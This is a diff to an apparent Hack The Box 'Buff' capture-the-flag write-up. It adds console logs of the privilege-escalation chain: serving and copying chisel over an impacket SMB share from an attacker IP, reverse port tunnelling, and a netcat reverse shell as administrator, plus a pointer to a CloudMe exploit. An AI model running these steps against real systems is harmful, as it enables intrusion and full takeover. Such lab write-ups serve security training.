@@ -63,6 +63,7 @@ C:\xampp\htdocs\gym\upload> whoami
 �
 buff\shaun
 ```
+
 ```console
 C:\xampp\htdocs\gym\upload> type c:\users\shaun\Desktop\user.txt
 �PNG
@@ -167,3 +168,53 @@ Linpeas shows the running processes and also tells us that the CloudMe service i
 This PoC should do the job pretty quickly.
 
 https://www.exploit-db.com/exploits/48389
+
+```console
+└─$ sudo impacket-smbserver rogue . -smb2support
+[sudo] password for npayne: 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+```console
+c:\Users\Public>copy \\10.10.16.16\rogue\chiselwin.exe chiselwin.exe
+copy \\10.10.16.16\rogue\chiselwin.exe chiselwin.exe
+        1 file(s) copied.
+```
+
+```console
+└─$ chisel server --reverse --port 1234
+2022/10/18 14:18:24 server: Reverse tunnelling enabled
+2022/10/18 14:18:24 server: Fingerprint RZQ9LOlLjBYeVcnA6fq7Fi90YADFsXsI+giE5JxJZp8=
+2022/10/18 14:18:24 server: Listening on http://0.0.0.0:1234
+2022/10/18 14:18:49 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
+2022/10/18 14:18:49 server: session#1: tun: proxy#R:8888=>8888: Listening
+```
+```console
+c:\Users\Public>chiselwin.exe client 10.10.16.16:1234 R:8888:127.0.0.1:8888
+chiselwin.exe client 10.10.16.16:1234 R:8888:127.0.0.1:8888
+2022/10/18 20:18:48 client: Connecting to ws://10.10.16.16:1234
+2022/10/18 20:18:48 client: Connected (Latency 31.6057ms)
+```
+
+```console
+└─$ nc -lvnp 5555
+listening on [any] 443 ...
+connect to [10.10.16.16] from (UNKNOWN) [10.129.7.44] 49680
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+buff\administrator
+```
+```console
+C:\users\administrator\Desktop> type root.txt
+type root.txt
+c2a8****************************
+```
